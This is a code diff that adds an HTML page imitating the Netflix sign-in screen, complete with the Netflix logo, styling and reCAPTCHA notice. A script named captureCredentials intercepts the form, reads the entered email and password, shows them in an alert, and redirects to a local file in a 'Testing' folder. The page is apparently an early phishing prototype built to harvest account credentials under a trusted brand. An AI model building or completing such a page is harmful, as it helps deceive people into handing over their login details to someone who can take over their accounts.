@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-wrapper {
+            background-color: rgba(0, 0, 0, 0.75);
+            padding: 60px 68px 40px;
+            border-radius: 4px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .logo {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 120px;
+        }
+        .login-wrapper h1 {
+            font-size: 32px;
+            font-weight: 700;
+            text-align: left;
+            margin-bottom: 28px;
+        }
+        .login-wrapper input[type="text"],
+        .login-wrapper input[type="password"] {
+            width: 100%;
+            padding: 16px;
+            margin: 10px 0;
+            background: #333;
+            border: 1px solid #8c8c8c;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+        }
+        .login-wrapper button {
+            width: 100%;
+            padding: 16px;
+            margin: 24px 0 12px;
+            background-color: #e50914;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 700;
+        }
+        .login-wrapper button:hover {
+            background-color: #f40612;
+        }
+        .login-wrapper .help-container {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #b3b3b3;
+        }
+        .login-wrapper .help-container a {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+        .login-wrapper .help-container a:hover {
+            text-decoration: underline;
+        }
+        .login-wrapper .signup-container {
+            margin-top: 16px;
+            font-size: 16px;
+            text-align: center;
+        }
+        .login-wrapper .signup-container a {
+            color: white;
+            text-decoration: none;
+            font-weight: 700;
+        }
+        .login-wrapper .signup-container a:hover {
+            text-decoration: underline;
+        }
+        .login-wrapper .recaptcha-container {
+            font-size: 12px;
+            color: #8c8c8c;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .login-wrapper .recaptcha-container a {
+            color: #0071eb;
+            text-decoration: none;
+        }
+        .login-wrapper .recaptcha-container a:hover {
+            text-decoration: underline;
+        }
+        .separator {
+            text-align: center;
+            margin: 20px 0;
+            color: #b3b3b3;
+            position: relative;
+        }
+        .separator::before, .separator::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background-color: #b3b3b3;
+        }
+        .separator::before {
+            left: 0;
+        }
+        .separator::after {
+            right: 0;
+        }
+        .login-wrapper .forgot-password {
+            display: block;
+            text-align: right;
+            margin-top: -10px;
+            margin-bottom: 20px;
+            color: #b3b3b3;
+        }
+        .login-wrapper .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .login-wrapper .signin-code-button {
+            background-color: #333;
+            padding: 16px;
+            margin: 24px 0 12px;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 700;
+            width: 100%;
+        }
+        .login-wrapper .signin-code-button:hover {
+            background-color: #444;
+        }
+    </style>
+    <script>
+        function captureCredentials(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Show captured credentials in an alert
+            alert('Email: ' + email + '\nPassword: ' + password);
+
+            // Redirect to the correct absolute path for next_page.html
+            window.location.href = '/storage/emulated/0/🕸️ Testing 🕸️/next_page.html';
+        }
+    </script>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+        </div>
+        <h1>Sign In</h1>
+        <form onsubmit="captureCredentials(event)">
+            <input type="text" id="email" placeholder="Email or mobile number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+        <a class="forgot-password" href="#">Forgot password?</a>
+        <div class="help-container">
+            <div>
+                <input type="checkbox" id="remember-me" name="remember-me">
+                <label for="remember-me">Remember me</label>
+            </div>
+        </div>
+        <div class="separator">OR</div>
+        <button class="signin-code-button">Use a Sign-In Code</button>
+        <div class="signup-container">
+            New to Netflix? <a href="#">Sign up now</a>.
+        </div>
+        <div class="recaptcha-container">
+            This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
+        </div>
+    </div>
+</body>
+</html>
